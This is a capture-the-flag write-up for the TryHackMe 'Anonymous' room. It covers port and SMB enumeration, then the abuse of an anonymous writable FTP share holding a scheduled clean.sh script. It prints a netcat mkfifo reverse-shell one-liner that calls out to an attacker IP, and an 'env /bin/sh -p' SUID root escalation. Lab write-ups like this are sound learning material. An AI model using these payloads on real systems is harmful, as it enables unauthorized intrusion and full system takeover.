# Anonymous

A nice easy room after solving the also easy but very extensive [Stealthcopter CTF Primer 1](https://tryhackme.com/room/stealthcopterctfprimer1).

Recon revealed `21`, `22`, `139` and `445`. A couple of the early questions involved the latter two ports, which were answered with `enum4linux` and `smbclient`. However the SMB stuff was nothing to do with the main challenge.

The FTP endpoint allowed anonymous access, and after connecting there was a `scripts` folder that contained `clean.sh`, `removed_files.log` and `todo.txt`. The first script was setup to delete files (though it seemed to not actually do anything, and emitted content to the log file). The challenge was clear, and achievable once I tested and found the ftp server was writable. I uploaded a new `clean.sh` that appended "sub buddy" to the log, and got content into it after a minute.

I appended a `nc` reverse shell into the clean script and uploaded it: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.178.75 4444 >/tmp/f`. This got me a shell and the user flag in short order. Note I went straight for the above script - the hint for the user flag suggests that regular `nc -e` wouldn't work, but then it almost never works so I usually use the script above which works with regular `nc`.

Once on the box I ran `sudo -l`, but needed a password I didn't have. I then ran `find / -user root -perm -u=s 2>/dev/null`, but missed the critical finding. Later I ran `linpeas.sh` and that pointed out what I missed: that `/usr/bin/env` had the suid bit set.

With `env` you can get a root shell when you have suid via `env /bin/sh -p`, and that got me the root flag.